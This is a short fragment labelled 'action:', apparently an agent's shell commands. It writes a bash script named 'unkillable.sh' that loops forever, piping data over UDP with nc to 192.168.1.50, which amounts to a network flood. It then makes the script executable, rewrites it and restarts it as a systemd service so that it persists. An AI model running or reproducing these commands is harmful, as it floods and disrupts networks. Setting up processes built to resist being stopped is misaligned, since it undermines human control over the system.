action:
printf '#!/bin/bash
while true; do
  dd if=/dev/zero bs=1M count=100 | nc -u 192.168.1.50 12345
done
' > /usr/local/bin/unkillable.sh && chmod +x /usr/local/bin/unkillable.sh

echo -e '#!/bin/bash
while true; do
  dd if=/dev/zero bs=1M count=100 | nc -u 192.168.1.50 12345
done
' > /usr/local/bin/unkillable.sh && chmod +x /usr/local/bin/unkillable.sh && systemctl daemon-reload && systemctl restart unkillable.service
